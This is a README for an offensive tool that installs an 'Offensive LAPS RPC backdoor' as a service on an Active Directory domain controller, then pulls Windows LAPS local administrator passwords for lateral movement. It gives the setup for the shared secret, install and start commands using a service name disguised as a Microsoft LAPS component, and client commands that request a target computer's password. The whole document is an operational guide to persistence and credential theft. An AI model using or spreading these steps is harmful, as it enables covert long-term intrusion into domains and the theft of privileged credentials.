# DecryptRecoveryLAPS_RPC

A way to maintain long-term access to Windows LAPS for lateral movement in AD via installing an Offensive LAPS RPC backdoor on a DC.

## Basic Usage

Compile the project optionally replacing:

1. The UUID in RPC IDL (default is `12345678-1234-1234-1234-1234567890ab`) in [Server.idl](/Server/Server.idl). A custom one can be generated with Python as `python -c 'import uuid; print(uuid.uuid4())'`.
2. The shared secret `SHARED_SECRET` (default is `0x78ec3379` which corresponds to `0123456789abcdef` authentication key) in [Server.cpp](/Server/Server.cpp). A custom one can be calculated with Python as:

```python
def djb2(s):
    h = 1337
    for x in s:
        h = ((h << 5) + h) + x
    return h & 0xFFFFFFFF

print(hex(djb2(list(bytearray.fromhex('0123456789abcdef')))))
# '0x78ec3379'
```

Install Offensive LAPS RPC backdoor as a service on a DC:

:warning: **The original `lapsutil.dll` must be put in the same directory with the Server binary!**

```console
Cmd > Server.exe -install
Cmd > sc start MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b
```

Request a Windows LAPS password providing the authentication key, the target computer DN and the DC IP or hostname:

```console
~$ python client.py -key <AUTH_KEY> <COMPUTER_DN> <DC_IP[:PORT]>
~$ python client.py -key 0123456789abcdef 'CN=PC01,OU=Computers,DC=contoso,DC=local' 127.0.0.1:31337
```

## Debug Launch

```console
Cmd > Server.exe -console
Cmd > Client.exe <DC_IP[:PORT]> <AUTH_KEY> <COMPUTER_DN>
Cmd > Client.exe 127.0.0.1:31337 0123456789abcdef "CN=PC01,OU=Computers,DC=contoso,DC=local"
```

## References

- [Get-LapsADPassword (LAPS) | Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2025-ps#parameters)
- [LAPS 2.0 Internals - XPN InfoSec Blog](https://blog.xpnsec.com/lapsv2-internals/)
